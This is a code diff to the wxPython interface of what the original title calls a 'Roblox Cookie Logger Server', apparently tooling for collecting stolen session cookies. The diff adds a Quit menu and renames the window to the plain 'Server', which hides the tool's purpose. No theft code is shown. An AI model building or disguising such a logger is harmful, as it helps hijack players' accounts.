@@ -28,11 +28,12 @@ class GUIserver(wx.Frame):
         self.btnToggleRun = wx.Button(
             self.panel, wx.ID_ANY, "Run  Server")
 
+        self.__do_menubar()
         self.__set_properties()
-        self.__do_layout()
+        # self.__do_layout()
 
     def __set_properties(self):
-        self.SetTitle("[GUI] Roblox Cookie Logger Server")
+        self.SetTitle("Server")
         self.SetBackgroundColour(wx.Colour(255, 255, 255))
         self.panel.SetBackgroundColour(wx.Colour(255, 255, 255))
 
@@ -73,6 +74,27 @@ class GUIserver(wx.Frame):
         sizer_1.Add(self.panel, 1, wx.ALL | wx.EXPAND, 5)
         self.SetSizer(sizer_1)
         self.Layout()
+
+    def __do_menubar(self):
+        menubar = wx.MenuBar()
+
+        # File menu
+        fileMenu = wx.Menu()
+
+        file_item = []
+        file_item.append(fileMenu.Append(wx.ID_ANY, "Quit", "Quit"))
+        menubar.Append(fileMenu, "&File")
+
+        self.SetMenuBar(menubar)
+        self.Bind(wx.EVT_MENU, self.onQuit, file_item[0])
+
+    def onQuit(self, event):
+        self.Close()
+
+
+
+
+
 
 
 class MyApp(wx.App):
